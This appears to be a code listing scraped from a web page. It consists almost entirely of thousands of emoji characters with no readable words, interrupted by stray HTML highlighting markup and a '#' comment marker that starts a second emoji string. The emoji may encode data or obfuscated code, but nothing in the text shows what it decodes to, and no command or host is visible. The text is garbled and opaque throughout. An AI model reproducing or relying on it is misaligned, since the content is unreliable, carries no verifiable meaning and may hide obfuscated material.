👎🐬👆👎🐾👁👩👅👍👣👑👙🐽👑👏👋👢👑👩👛🐨👧🐿👆👍👛👅👉🐼👑👀👎👋🐹👦👛🐨👐👰👊👢👛👡👉👢👁👘👑👎👫👘👌🐽👢👰👚👱🐽👎👄👍👁🐧👐👢👑👆👘👍👛🐾👉👏👟👎👙👋🐼🐧👐👎🐨👎👉👢🐨👍👎👢🐬👎👍🐩👟👌👎👎🐨🐧👛🐨👈👯👎👥👉👅👍🐽👁👎👋👍👛🐫👍👣👑🐿👛🐼🐰👏👉👢👧🐧👑👌👟👮👎👣👑👏👋👋🐽👎👘👢👑👃👑🐼👛👎👉🐩🐽🐾👑🐼🐬👠👙🐼👐👱👍🐨👑👢👜👤👍🐿👋👥👁👆👍👣👧👦👌👤🐬🐺👙🐨👉👎👘🐼👅👅👙🐽👧🐧👐🐧👍👂👘🐧🐨👪👎👢👟👎👉👱👍🐿👍👢👛👂👊🐽👍👪👘🐽👧👟👄👍👦👱👍👎👫👘👐👍👀👯👑🐿👉👢👉👣👑👧👍👤👯👮👊👍👛👌👈👣👛👡👄👍👧👀👌🐩👯👦👘🐽👁👪👊👣👑👎👘🐨👑🐪👑🐾👯👘👚🐨👛👫👉👣👅👅👍👥🐸👮👍👎🐧👯👄🐽👉👫👉👏👟👡👉👎👯👏👐👎 👫👩👜🐽👑👌👉👣👅👡👄👍👁👰👐👌👛👦👌🐩👁👎👊👣👛👎👙👋🐼🐧👎👍👛👎👚🐨👍👬👊👣👟👠👍👍👧👑👍👎👯👊👍🐨👐👯👌👏👟👏👙👋👣👎👋👌👉🐾👊👣👍👏👜🐾🐰👎👄👢👑👰👐👥👧🐺👎👣👑🐽👎👤👟👘👉👍👧👇👐👱👁👂👊🐾🐽🐾👋👣👅👎👉👣👧👐👍👤🐧👯👅🐽👣👏👌👏👣 👊👘🐩👉👐👍🐧👛👊👎🐽👑👩👍👤🐽👏👉👤👯👰👍🐩👫🐧👙🐾👁🐿👌👥👣👎👙🐽👁🐿👐👌👑👂👍👍🐽👨👋👣👑👅👙👣🐽🐪👍👤👧🐹👜🐽👐👰👋👢👛👟👉👤👉👦👐👋🐽👮👎🐽👛👪👍👤🐽👟👄👢🐨🐬👌👤👫👢👍👤👁👏👘🐼🐰👑👘🐨👑🐪👋👢👑👘👚🐨👧👀👑🐽👉👅👘🐩👮🐧👍👡🐽👦👙 🐨👑👫👊👢👛👡👉🐩👟👎👐👣👟👅👜🐽👐👯👎👣👛👢👉🐨👑🐿👎👢👌🐨👋👣👑👫👛👱🐽👏👘🐨👑👋👌👋👁🐾👉👢🐨👎👎👤👣👊👉👋👍👎👎👎👫👘👐👎👅👪👎👥👅👘👉👏👉👋👋👎👪🐨👊👣👌👰👜🐾👫👍👄🐻🐹🐬👐👌👚🐬👍🐩🐽👩👊👥👁👎👍👱🐽👏👑🐼👑👊👚👣👧🐿👉👣👅👅👙👤👟👘👍👣👛👮👊🐩👀👯👎👥👅👏👙👢🐬👦👌🐧👛👊👌🐨👣👪👎👤🐽👋👉👣👧👀👑🐼👛🐧👍🐨👐👮👚🐼👣👘👍👎👟🐻👍👤🐨👂👎👍👉👐👘🐽👧👟👘🐨👧👌👍👡🐹👢👍🐨👁👫👌👢👛👘👉🐩👯👋👋👍👍👮👐👍👑👩👎👤🐽👠👄👣🐽🐫👍👎🐬👆👎🐾👁👩👅👏🐽👍👙👋🐽👭👎👍👑👪👍👍👅👫👆👍👑👊👙🐿🐹🐫👍👋👁🐧👄🐽👐👰👊👢👟👍👙👥🐹👘👍👣👑👮👄🐨👣👍👍👏👟👏👍👢👑👑👐🐧👑👢👌🐩👁🐾👚🐾🐰👏👘🐨👁🐿👎👍👛👊👉🐨 👅👬👊👤👟👊👄🐨👁👌👎👎👫👘👛🐩👉👪👑🐿👅👘👉🐼👁👘👍👤🐨👊👜👣👛👩👘🐼🐰👎👄👢👧👎👍🐩🐧🐬👍👍👑👪👚🐿👧👌👍🐼👑👋👍👡👁🐾 👉👣👧🐾👑🐼🐬👟👄🐧👀🐨👍🐨👉🐺👐👎👀👯👎👏👣👊👎🐾👟👐👐👎👪🐨👎🐽👍👪👎👥👛👎👄👏🐹👎👍🐩🐨🐧👘👤👁👀👈👢👣👑👄🐾👉👱 👍👢👑👂👍👤👅🐽👚🐽👛👠👍🐼👀🐧👎👣👛👱👜🐽👐👯👑🐽👣👠👉👣👁👦👋👎👯👂👎👍👛👎👑🐻👉👋👄👎👉🐿👍👎👯👢👎🐾👁👫👌👤🐰👍👙 👋🐽👋👍🐧👑👑👜👎👅🐭👉👤👣👊👘🐪🐸👯👍👍👛🐧👙🐨👛🐿👉👏👟👡👉👢👁👘👍👤🐨👊👉🐨👧👍👑🐼🐰👊👄👢🐬🐿👐👌👑👢👋👢🐨👍👚🐻 👍👎👄👎👉🐪👌👡👁🐽👜🐽👅👐👙🐽👉👟👄👥👟👍👎👎👫👢👙🐩👅🐾👙🐿👅👏👘🐪👉👪👐👢👑👮👄🐽👉👍👘🐾🐰👎👘👱🐽👐👍👎🐬👮👎👣👑🐽👅👏👁👎👘👢👧👃👍🐨👑👎👚🐩🐽🐾👍👣👛👅👄👌👣🐭👍👤👧🐺👐👍👐👰👌👢👟👌👘🐨👧👈👍👤🐨👊👎🐽👣👩👘🐼👅👆👙🐾👉👍👌👎🐧 🐬👍🐼🐨👎👙🐻👅👌👍👣👑👭👍👤🐨🐽👜👤🐽🐾👘🐽👍👎👍🐨👁👌👍👡🐹👘👍👤👍🐾👑🐿👅👌👙👏🐹👆👐👏👧👎👊👍👐👰👛🐾🐽👌👄👍👣🐬👌🐩👯👎👘🐾👍👩👚🐽👟👑👙🐽👁🐿👋👋🐽👎👚👍👁👬👋👣👟👊👘🐪🐹👘👎👍👍👢👉🐨👌👯👎👏👣👟👉👤👯👐👍👤👯👂👋🐽👣👨👉👣👛👎👄 👎👉🐨👍👎🐨🐧👍🐽👀👯👊👣👛👎👉👣👧👟👑🐻🐸👯👉🐩👅🐽👎👤👟👊👄🐨👁👐👍👎🐨🐫👛🐩👍👪👘🐪👛👟👊🐾👉👐👌👡🐹👎👅🐽👌👰👜 🐽👅👎👄🐻🐽🐨👐👌👛👦👐👍👁👏👌👣👟👍👘👢👧🐿👌👡🐽👢👚👢🐬👏👙🐾👣👎👄👤👚👯👍👤👧🐾👐👎🐼👮👅👌👛👍👎🐾👟👌👐👤👫👮👌🐽👑👫👄👍👅👟👉👣👑🐧👋👣👍👆👘👣👁👪👎👡🐹👘👉👎👟👩👍👢👑👘👚🐩👅🐼👈👤🐽👊👍🐨👁👀👍👡🐹👢👊🐨👐👯👑🐿👅👠👉👤👉👧👍🐧👑 👂👅👣👑👫👜🐾👫👋👄👎👉👏👌👤🐬👎👌👤👁🐾👚🐾🐰👑👍🐼👑🐪👍🐽👑👘👊🐼🐨👌👌👣👧👎👄🐻👍🐭👎👍👉👆👛🐩🐽🐾👊👏👣👣👉👋👣 👏👐👣👟👦👐👍👉👍👎👤🐽👡👍👢🐬👯👌👎👯👮👍🐩👁👎👊👢👧👎👍👱🐸👯👍🐻👁🐾👚🐨👅👬👌👤👟👊👙👎👟👟👍👤👫👎👐👎🐽🐾👚🐽👛👏👙👤👉👏👐👢👛👊👄👍👑🐿👄👏👛👎👄👢👍🐭👌👎👧👘👎🐽👑🐽👊👥👁👌👘🐨👧👎👑👍👑👆👚🐨👧🐾👌👤👣👎👍👥🐹👘👍👤🐨🐧👍🐨👄👰👋👥👅👠👊🐼👑👋👐👢👑👮👚👣👉👍👌👢👛👏👙🐽👧👐👋👍👚🐬👍👢🐨👪👎👡🐹👘👍👍👧👱👍👡👁👂👎👍🐽👪👈👣👛👎👉👍👧👰👍👎👧🐾👛 🐨👀👯👚🐼👛👟👉🐩👯👦👑👎👯👘👎👣👑👩👎👤👫👣👘👱🐽👏👍🐾👫👢👎🐽👛🐿👜🐿👅👍👙👥🐹👱👐👡🐽👘👛🐼🐨👎👋👣👉👊👙🐽👐🐨👍🐾👯👦👋🐨👐👮👄👏👁👡👉👣👧👎👐👢👑👂👉🐽👐👮👎👤🐽👡👄👍👧👯👍👎👯👘👘🐾🐼👱👈👣🐽👎👍🐪🐹🐿👐👋👁👅👜👍👁👩👘🐾👟👊👄🐩👟👮👍👡🐹👢👙🐩🐽🐾👎👥👉👣👉🐪🐹👪👌👣👉🐾👊👍👑👎👘🐿👅👎👄👢👧👀👍👎🐧🐬👍👍👑🐽👚🐽👉👎👄👍👧👱👑🐼👌👯👍🐨👉👪👘🐽👅👠 👉👏🐹👘👍🐩👫👎👐👎🐼👯👌👏👟👋👙👣👁👩👌👢👌🐨👎👍👣👌👊👢🐬👅👍👣👣🐪👍🐩👫🐧👘👢🐨👩👅👌👧👑👄🐽👧🐪👍🐾👯👁👜👍👦👱👚🐽👛👠👎🐼👁👄👍👎👧👂👋🐩👄👯👚🐼👣👌👙🐽👧👧👌🐧👍👂👌🐽👛👏👄🐿👟👠👙👍👑👱👍🐩👯👦👘👣👁👏👌👥👁👌👍👣👌👯👌🐨👑👍👜👎👉🐿👆👎👟👊👘🐩👮🐩👎👍👍👦👈🐨👑👫👊👣👍👎👘🐨👁👐👍👤👯👮👘🐽👧🐽👑🐼🐰👊👙🐿🐹👀👐👌👛👪👍🐩👁👀👈👢👫👎👙👋🐹🐪👋👍👑👅👜🐽👍👬👋👣👟👠👙🐼👧👏👎👎👫👢👅🐽👛🐾👌👣👑👘👉👢🐬👩👐👢👑👪👅🐽👐👰👅👌🐰👟👄👌👣🐫👍🐩👫👢👐👍👁👏👌👡👅👎👉🐪👟👟👐 👱👁👆👉👍👍👪👑🐽👛👠👍👋👈👮👍👣👛👮👉🐩🐼👯👊👏👟👌👙👣👑👎👐👣👟👦👍👍👍👨👋👤🐰👏👍👣👧🐿👎👏👧🐾👍👤👁👎👉👡👉👎👄👡 👍🐿👍👎👯👢👊🐾🐽🐾👘🐽👍👎👄🐧🐨🐫👍👋🐹👘👚🐩👅👪👑🐿👅👘👉🐩👟👏👐👋👅🐺👅👣👛👏👛🐽👅👌👄👍👣🐬👌🐩👯👎👌🐨👑🐽👊👣👣👎👙👋🐽👋👍🐻🐽👮👍👣👛👬👑🐽👉👎👙🐼👧🐭👎👍👍👢👚🐨👌👰👊👢👣👉👙🐿🐹👏👐👣👉🐺👅🐽👉👍👑🐽👁👢👄🐻👍👏👎👢👑👦👘👍👁👬 👈👣👧👏👍👣👁🐿👑🐻🐽👎👍🐨👛👬👌👤👫👊👎🐽👁👏👍🐽👑👘👐👍👅🐾👎👣👛👟👉🐪👉👎👍👤👯👘👍👣👉👍👌👥👁👈👌👋🐧🐰"</span></span><br><span class="line"><span class="comment">#👍👤🐧👮👛🐩👈👰👌👏👣👍👎🐾👯👎👍🐧👛🐫👍🐨👐👮👑🐻👉👎👄👍👣🐪👎👢👉👊👍🐧🐨👎👙🐻👅👏👘🐨👁👋👍👡🐸👯👍🐩👁🐼👋👣👟👟👄👌👧👌👍👤👧🐹👜🐽👐👰👊👢👍👌👙🐾👟👦👋👍👍👮👍👍👑👫👚🐼👁👣👉👣👣🐬👌🐩👫👎👍👎👁🐿👘🐾🐰👌👍👣👑🐪👍👣👑👘👚👍🐽👫👉👣👉👅👙🐼👧👁👍👤🐨🐧👘🐨👛🐿👊👢👛👡👉👋👣👘👍👡👅👊👉🐨👧👍👎👤🐽👢👉🐧🐬🐾👌🐩🐨🐫👌🐩👁🐿👛👱🐽👎👍🐼👦👮👍👡🐽👘👎🐽👅👩👘🐾👟👊👜👤👯👎👍👤👧👆👋🐧🐧👯👚🐽👑👏👙👌👑👩👌👡🐸🐨👉🐨👧🐽👎👣👅👌👙🐽👧👍👍👤👫👮👍🐩👁👌👉👏👛👎👘👢👑👏👑🐼👑👆👚🐨👛👪👘🐾👣👊👄👤👟👑👍🐨👛🐫👙🐩👀👰👍👥👅👍👙🐽👑👋👐👣👍👘👚👍👑👫👛🐾🐽👅👉👣👑🐧👑👌👑👆👍👎👁👍👚🐼👛👑👄🐽👑🐪👍👡👁👂👍👍👁👐👑🐽👧👎👉👍👧👰👍👋🐹👘👋🐩👅👪👚🐼👟👡👉👣👁👋👍👣👟🐺👎👣👐👯👎👣👅👊👄👣🐽🐬👌👤👫👢👘👣👁👫👌👣👣👑👙🐽👑👟👐🐩👯👎👚🐨👍👩👑🐽👛👠👉👥🐹👑👎👣👍👘👋🐨👑👏👊👣👑👏👍🐼👧👎👐👢👑👂👊🐽👑👨👊👢👑👣👍👣👑👑👎👢👑👮👙🐾🐼👱👈👢👣👏👎🐿🐹🐿👍🐻👁👊👍🐨👑👬👌👤👟👊👘👱👍👱👎👎👯👦👙🐨👛🐾👎👥👉👅👎🐾👉👍👋👍👑🐾👄🐨👉👍👘🐾🐰👟👙🐼👧👱👐🐧👑👪👎👤👁🐾👎👤👟👑👄👥👟👏👐🐨👑🐾👍👍👁👪👋👢🐬👎👄👌👦🐨👍👤👧👁👄👎🐼👯👎👏👛👅👍👍👑👋👐👋🐽👮👍🐨👣👩👎👢👫👋👉👣👧👯👌👤🐨🐾👌🐩👁👍👙🐻👑👏👘🐨👧👩👐👌👛🐽👜🐾👅🐿👆👍👛👟👘🐧👧👦👍👢👉👂👋🐩👉🐾👊👥👁👟👉🐩👟👋👐👏👧👎👜👣👛👏👜🐾🐰👠👄👎👉🐿👍🐩🐬👊👋👣👛🐿👌👣👑👌👍👣👧🐿👋👋🐽👊👍👤🐽🐿👆👎👟👠👉👏🐹🐭👎👋🐹👘👚🐨👛👫👊👢👛👏👙👎👟👘👋👎🐬👦👎🐽👢👯👎👢👛👎👍👢👧👱👍🐾👪🐨👎🐽👁👍👚🐼👣👎👙👏🐹👃👋👢👑👉👜🐽👛👪👘🐽👉👟👄👣👁👯👍👎🐧👯👅🐾🐽🐾👍👏👛👟👉👌🐬👌👌👤👯👮👜🐽👍👫👄👌👛👍👄👢👧👎👐👢👉👘👎🐾🐼👯👚🐿👁👑👍👎👉🐾👑👌👛👆👊🐼🐰👎👑🐾👟👟👄🐿🐹👭👍👤👫👊👊🐨👈👰👌👢👛👋👙👢👧👦👌👡👁👦👍🐽👣👐👚🐽👛👣👙🐾👉👐👑👌👚🐬👘👌🐨👏👌👢👟👎👄👡👍👋👍🐾👯👆👊🐾🐽🐾👈👣👑👠👍🐼👌👮👍👤👧🐾👌🐨👑👫👉👢👟👇👍👤👟👋👋👌👟🐺👅👍👑🐿👜🐾🐽👡👄👎👉🐧👌🐩👫👢👎🐾👁👏👘🐾🐽👌👍👱👍👭👍🐧👑👩👜🐽👛👩👑🐽👛👎👘🐪🐹🐭👍👢👛👱👄👍👛🐾👊👣👑👡👉👎👯👏👐👣👟🐺👋🐽👉👩👎👣👁👣👉👤👉👱👐👌👑👊👘🐼🐨👪👊👥👟👎👍👱🐼🐧👑🐻🐽👢👉🐩👁👀👋👤👟👊👘👱👍👇👍🐽👑👘👛🐩👍🐾👍👏👣👢👉🐼👁👏👋👍👑👮👜👍👢👮👎👥👛👏👉🐧👍🐫👐🐧👟👂👎👣👑👏👌👢👛👘👍👎👉👇👌👡👁👂👉🐩🐽🐿👘🐼🐬👎👙👢👁🐩👍👤🐨🐧👌🐨👄👯👌👥👉👎👘🐩👉👨👌👣👛🐫👍👣👣👪👑🐾🐰👎👉👣👁👐👋👣👚🐬👍🐨👑👪👚🐼👟👏👍🐼🐬👭👐👍👌👯👎🐽👍👬👚🐽👛👅👍🐩👟🐩👍🐨👑👘👊🐨👀👯👋👥👍👉👙🐽👑👏👋👋🐽👂👅👣👑🐿👜🐾🐽👑👍🐨👁🐾👋👣👑👘👌🐽👑👫👌👥🐹👎👙🐾👟🐻👌🐨👑👘👚👍👅👨👌👣👑👅👍🐨👀👮👍👋👁🐧👘🐨👛🐿👊👣👟👟👉🐧👑👍👍👥👧👎👛👣👐👮👎👥👁👣👉👤👉👰👎👢👑👢👍🐩🐼👱👈👡👑👎👘🐩👉🐭👋👍👑👢👉🐨👅👪👎👤👧👊👍🐪👟👐👎👎👯👦👈🐨👉🐾👌👥👁👏👙🐼👧👪👌👤🐨👊👜👣👣👍👎👣👅👟👉👋🐽👱👌🐩🐬👦👍🐨👑🐭👉👋🐹👘👉🐼👑👩👌👡👁👂👊👍👉👫👘🐽👅👟👜👣👑👈👍👢👑👘👐👎👈👰👍👢👛👎👎🐾👯👩👌👢👍👂👎🐽👉👎👎👥👛👣👍👤👫🐪👍🐩🐬👢👎🐽👀👮👍👡👉👑👄🐾👟👃👍🐩👯👘👎🐽👍👩👑🐾🐽👎👍🐨👁👈👍👎👧👂👊🐨👀👰👉👢👟👟👉👋👍👏👐👤👫👂👄👣👑👫👄👋🐹👍👄👌🐨🐫👍👎🐬👊👍🐩🐼👰👌👥🐽👍👙🐾👈🐧👍👤👯👪👚🐨👧🐿👆👍👛👊👙🐼👧👑👍🐾👯👡👅👍👐👯👎👥👅👡👉👎👟👐👍👢👌🐨👛👣👣👎👍👏👟👏👉👣👑🐨👐🐧👑👢👋👣👐👰👘🐻👁👎👄👍👧👟👌👱🐽👁👜🐽👉👬👍👣👁👠👉👣👧👐👍🐽👉🐾👊🐧🐬👪👎👢👟👣👉🐧👑👘👍👡🐽👂👉🐨👉👪👎👤🐽👍👉👣👧🐧👍👎🐬🐺👍🐩👁🐿👘🐼👉👍👄👍👧👟👐🐨👑👆👚👍👍👪👎👢🐬👎👄👌👣🐪👍👣👉👂👄🐾👀👰👉👢👛👋👙👢🐬👌👐👢👛👦👍👣👑👪👎👥👛👅👄👍👧👰👍🐩🐨🐾👘👣👑👩👚🐻🐽👏👘🐨👧👇👍👡👁🐽👜🐾👅🐼👍👣👛👊👉👍👧👰👎👏👧🐾👍👤👈👮👄👌👣👠👉🐩👟👋👐👣👟👦👎👍👛👏👜🐾🐰👉👄👍👁🐿👍👎🐬👂👎🐾👁🐽👚🐿👅👍👙👋🐽👋👑👎👯👪👍👣👛👪👋👤👟👊👍🐼👑🐭👍👋👀🐨👙🐨👐👯👎👡👑👉👘👣👁👍👐👋👁👊👊🐽👍👨👉👤🐽👏👍👥🐹👀👐👌👑👆👍🐨👑🐾👎👣👑👎👙🐾👅🐫👋👢👛👉👜👍👑👩👑🐽👛👠👉🐨👁👭👍👎🐬👮👚🐩👀👯👌👣👛👏👙👤👉👪👐👢👑👪👅👍👢👮👍👤👫👎👄🐻🐽🐽👌👤👧🐾👎👣👑👏👘🐼👯👎👄👥👟👟👍🐧👑👎👚👣👧🐿👉👣👛👅👄👤👟👁👍🐨👉👁👜🐽👄👯👊👏👟👡👉👎👟👧👌👤🐨👦👍🐽👑👪👘🐼👅👋👄👍👧🐧👋👍👉🐺👍👢🐨👍👄👋👉👎👙🐾👟👭👍🐧👑👢👊🐾🐽🐾👙🐽👧👠👎🐾👟👦👍👤🐨🐫👚🐩👅👪👚🐼👟👇👍🐪🐹👋👐👢👟🐺👅🐽👑👌👊👏👛👆👍🐧👧👀👌🐩👫👦👍👤👁🐿👜🐾👟👎👙🐾👉👆👋👍👑👪👍🐨👑👐👘🐾👧👠👍👏🐹🐾👍👣👛🐫👘🐨👉👫👉👥👅👏👙🐽👑👏👐👋👁👉👄🐽👣👌👉👢🐰👊👄👍👧🐨👍🐾👯👦👘👍👁👪👚🐽👣👎👉👣👁🐿👌👱🐸🐨👚🐨👛👩👘🐾👯👊👄🐽👧👐👍🐽👛🐫👊🐨👅👎👎👣👟👢👉👱👣👦👋👍👍👪👅👍👣👍👘🐼👅👎👙👌👧👀👐👌👍👆👐👍👁🐽👎👤👟👑👜👢👑🐪👌👣👑👎👛🐾👅🐽👅👍👛👅👍👎👮👱👍👤👯👊👊🐧🐨🐿👊👏👣👊👘🐩👉👌👐👤👪🐨👍👍👣👩👑🐾🐰👎👙🐽👧👱👍🐩🐬👢👋👢🐨👎👚🐿👣👎👄👡🐽🐿👐👎👯👘👚👢🐬👐👙🐽👟👟👄👏🐹👈👎👍👑👘👊🐩👅👫👋👢👍👏👙🐾👉👦👋👎👪🐧👄🐽👛👐👚🐼👛👎👙👍👑👏👍🐾🐬👎👍🐾👁🐾👊👥🐹👎👙🐽👧🐪👍🐨👑👘👉🐨👣🐭👉👤👣👅👍🐨👁👀👎👎👫👦👉🐨👑🐿👉👏👟👡👊🐼🐬👎👐👣👉🐾👍🐽👐👰👜🐾👫👡👙🐽👧👍👌👤👯👢👋👣👑👬👈👡👑👏👍🐼👁👟👍👡🐽👢👉🐨👛👐👚🐽👑👠👘🐪🐹👐👍👤👫👎👐👎👍👪👎👥🐽👊👙🐾👉👨👋👍👛👊👜👣👣👍👑🐿👅👎👄👍👧🐨👌👎👯🐾👍🐩🐼👯👚🐾👟👏👍👤👉👊👑👍👑👘👚👣👧🐾👑🐽👟👊👄🐩👟🐬👍👣👛🐧👍🐨👄👯👑🐼👛👍👙🐾👉👐👐👤🐨👊👚🐨👑👫👄👋🐹👅👄👍👣🐬👋👣👛🐧👎🐽👁👩👙🐻👅👎👙👏🐹👋👍🐩👪👯👉🐨👅👪👈👣👛👅👘👢👑🐿👎👣👑👘👍🐩👅👪👚🐼👟👊👙🐾👉👆👋👎🐨👦👊👣👐👯👌👢👧👣👉👢🐨🐫👌🐨👟👪👌🐩🐼👰👌👤🐰👍👙👏👟👃👍👢👑👘👚🐩🐽🐽👋👣👉👅👍👥🐸👮👍🐽👑👊👈🐨👑👩👄👍👑👅👍🐽👁👏👐👢👛👦👛👣👐👮👎👤👫👋👉🐧👑👀👐👌👑👘👋👣👁👬👈👤🐰👎👙👋🐼🐧👐👱👁👆👚🐨👧👀👊👤👫👊👄🐧👁👌👎👎👫👦👈🐧🐬🐾👎👥👁👑👄🐩👉👇👍👤👯👪👅🐽👐👰👅👌🐰👟👙🐼👧👐👐👌👑👪👍🐩🐼👯👍👏👟👘👉🐪👟👱👍👡🐽👘👎👎🐽🐾👘🐽👅👠👉👤🐰🐫👍🐨👉🐺👐👎🐼👯👌👥👅👏👎🐾👯👦👌👢👍👮👎🐽👉👎👎👥👛👟👉👣👐🐩👌👤👫👮👙🐽👁👪👊👡🐽👎👉👱🐽🐿👍👋👁👂👉🐩👅🐾👙🐽👟👎👄🐨👁🐩👍👍👉🐹👄👎👄👯👑🐿👁👟👉🐪👉👋👋👌👑👮👎👍👛👏👜🐾🐽👑👍👤👉👏👍🐩👯👦👘🐨👁🐭👙🐾🐰👌👍👣👑🐪👋👌👑👪👍👣👛👪👋👣👛👎👙🐿🐹👐👎👋🐹👢👉🐨👑👎👎👥👅👡👉🐩👟👘👑👎👫👘👄🐨👍👪👎👣👛👢👉🐧🐬🐾👋👣👑👢👋👣👑👏👛🐪👧👎👙👏👟👋👌👱🐸👯👊🐽👁👐👘🐾🐽👊👍🐩👟👍👎👎👫👢👙🐩👀👯👍👥🐽👉👙👌👑👏👐👢👑👮👄🐽👧👍👘🐾👫👌👘👱🐽👑👌👎👯👪👐👍👑👏👘🐼👯👑👘🐨👧👘👑👌👑👢👚👤👅🐾👘🐾👟👅👎🐼👁👉👍👤🐨👮👊🐨👁👫👍👢👟👌👘🐨👑👏👐👢👛👊👍🐽👍👪👎👥👛👣👍👤👉👑👐🐧👍👢👍🐩👁👎👉👡👅👌👍👣👑👱👐👍👑👁👜👎🐽🐾👌👣👧👠👉🐩👟🐩👍👡🐽👘👘🐨👛🐿👍👢👟👇👍👢👧👆👍👤👫👮👊👍👑👪👐👱🐽👋👄👎👉👀👌🐩👫👘👘👣👅🐽👅👍👛👑👙🐽👁🐿👍👢👑👮👎🐾👍👀👋👣👛👠👉🐨👁🐭👍👢👚👯👙🐨👌👯👎👢👑👏👘👣👧👏👍👢👍👩👜🐽👣👨👉👣👧👣👉👤👉👯👍🐩👯👆👍🐨👁👍👚🐾🐰👎👍🐪👉👏👎👍👛👆👚🐨👑👬👉👣👉👟👄🐨👁👍👍👤🐨🐫👊🐧🐨🐾👙🐽👑👏👘👱👣👦👌👡🐽👘👜👣👐👰👜🐼👛👎👄👢👍🐫👐🐧👛👦👎🐽👑👫👌👣👅👘👍👣👧👟👐🐩👯👮👉🐨👧🐾👘🐽👅👅👄👤👞🐨👍👤👯👢👄🐽👐👯👋👏👟👘👉👎👉👏👐👤👯👂👚👣👌👮👑🐽👅👡👄👎👯👰👍🐩🐬👆👋🐨👑👬👈👣👛👑👍👎👈👮👍🐧👑👂👚👤👁🐼👋👣👛👠👎🐼👁👌👍👡👁👱👜🐽👅🐿👉👢👑👣👉👤👉👆👐👤🐨👦👙🐨👑👨👈👤🐽👎👄👢🐬👱👐🐧👍👦👌🐩👁🐿👌👣👟👌👍👣👑🐪👍👎👯👘👚🐨👍👩👋👤👟👅👍👎👮🐧👍👋🐽👦👚🐨👌👰👉👏👣👟👊🐼👁👎👐👣👟👅👜🐽👢👮👎👥👅👎👍👢👑🐨👎👢👌🐨👘👍👁👬👈👏👛👎👉👣👧👋👌👋🐽👘👚👢🐨👎👎👢🐬👎👉👢👧👐👍👤🐧👯👙🐩👍👪👎👥👅👏👙👏👉👌👌👡🐽👘👊🐽👐👰👜🐿👛👎👄👌👧👏👐👡👅👮👎🐽👑👪👎👤👟👎👘👢👧👇👍👡🐽👊👛👍👍👪👈👣👛👠👍👢👧👍👍🐨👛🐧👍🐩👈👯👑🐿👅👏👘🐩👟👪👌👡👅🐺👌🐽👑👫👜🐿👅👆👉👣👣🐬👋👣👌🐬👘🐾👁🐽👚🐽👣👑👍👍👧👱👍👡👁🐽👜🐽👑👐👘🐾🐽👊👄🐩👟🐭👍👤👧🐾👐👍👛👏👉👢👟👡👉🐩👯👏👍🐧👍👂👊🐽👑👫👜🐾👫👆👉🐧👍🐫👍👎🐬👆👎🐽👛🐿👜🐾🐰👍👘🐨👑🐪👍🐧👑👪👎🐾👉🐽👛🐾👧👠👉👣👢👰👍👎🐨🐧👄🐾🐽👫👉👡👑👎👙🐾👟👐👐👋🐽👮👘🐽👣👎👎👢👫👡👄👢🐬🐿👐👢👑👦👍🐧🐧👰👘🐾🐰👎👍👱🐹🐫👍👎🐨👎👉🐨👧👀👍👣👑👠👎🐼👁👌👍👤👧🐾👊🐨👛🐾👎👢👛👏👙👌👑👩👋👌👉🐾👊🐽👑👫👅👍👅👟👄👌👦🐩👐👢👑👢👍👤👁👐👘🐻👅👌👍👍👧👟👍🐧👛👆👅👣👑👪👘🐾👣👊👙👢👁👀👍👢👛🐫👍🐨👌👯👎👣👟👋👘🐩👉👨👌👡👁👦👍🐨👉👍👑🐽👅👏👉👣👍🐪👍🐩👫🐧👘🐨👀👮👅👌👛👌👙🐽👧👩👍🐾👯👘👎🐾👈👱👚🐽👛👠👎🐾👟👌👍👏👧🐹👜🐽👅🐾👊👣👣👟👉🐧👑👋👍👡👁👦👍👣👛👏👛🐾👫👠👄👢👣🐫👍👤🐬🐾👌👤👁👍👎👣👟👑👘🐨👧🐪👋👌👑👮👍👤🐽🐿👛🐽👍👟👜👢👑👘👍👍👛🐫👚🐨👣👎👎👣👟👟👉👏👟👘👐👋🐽👮👐👍👧👍👎👤👫👡👙👌👧👀👌👤👯👆👍🐧🐨👍👎👏👧👎👙👏👟👋👌👱🐽👂👛🐽👑👬👋👣👅👠👉🐪👟👦👍👎🐧👯👙🐩👅🐾👍👥👉👣👊🐾👉👧👋👍👛👊👎🐽👑👏👛🐻🐹👍👄🐻🐽👐👍👎👫👦👍👢🐨👬👘🐿👧👏👍👣👧👂👑👎👯🐾👚🐨👍👪👑🐾👟👟👜👣👐👰👍👤👧🐾👐👎🐼👯👑🐼👟👎👘🐩👟👈👍👤👫👮👋🐨👑👫👛🐿👛👋👍👣👧👱👎👏👧🐾👍🐼🐨👏👌👢👣👍👄👥👉👟👐👎👯👆👉👢🐬👎👑🐽👧👠👉👢👧👀👍👤👫👘👛🐨👛🐿👍👢👣👌👙🐾👉👧👌👡🐽👂👅👣👑👩👐🐪👟👠👄👍👍🐫👍🐩👫👘👎🐾🐽👪👚🐽👟👎👘🐨👑👰👑👌👑👪👚👍👁👪👚🐾👯👊👙👍👁👘👎👋🐹👘👐👎🐽👎👊👏👣👟👉👥🐹👏👐👣👉🐽👄🐽👧🐼👉👥👅👎👄👢🐬🐿👍🐩👯👦👘👍👛🐾👊👥👣👎👙👋🐼👮👑🐻👁👎👚🐨👛👬👌👢🐬👎👜👤👯👎👎👎👫👎👛🐨👅🐾👎👏👣👅👍👎👉👏👋👎👫👮👊👍👑🐿👚🐽👅👎👍🐧👍🐬👍👎👯👆👐👍👑👪👚🐾👟👑👄👥👟🐪👌👡🐽👮👊🐾👁🐿👙🐽👅👏👉👌👢👯👍👤🐨🐫👌🐨🐼👰👉👏👟👎👎🐾👯👍👐👋👁👊👎🐽👣👫👛🐾🐽👍👄👎👯🐧👋👍👑👆👎🐽👁👪👊👣👟👎👄👡👍👇👍🐻🐽👘👛👍🐽👩👑🐽👧👎👍👣👌👯👍👡🐹👘👊👤👈👰👋👢👑👟👉👥🐹👆👌👤🐬🐺👄👣👑👨👊👥👧👣👉👢🐬👀👌👤👫👘👙🐽👁👫👌👢🐰👑👙👋🐽👭👐👡🐽👘👚👍🐽👫👉👣👛👅👘👱👍🐭👎👋🐹👎👙🐨👌👰👊👢👟👍👙🐾👟👍👍👤👯👘👄🐨👑👏👜🐾🐽👡👄👏🐹👁👎👢👑👊👋👣👑👌👉👋🐹👎👍🐼👑👭👐👱🐽👍👜👍👁👐👙🐾👟👊👜👤👯👏👎👎👫👘👊🐨👛🐾👎👏👛👏👙👢🐬👩👌👡🐽👂👉🐨👧🐽👍👋🐽👟👍👢👧🐨👌👍👟👢👍🐨👁👪👚🐽👉👍👍🐼👑👟👐🐩👪👯👍🐨👛👩👅👍👛👊👘🐪🐹👑👍👤🐧🐨👛🐨👐👯👎👢👛👏👙👢👑👌👐👋🐽👮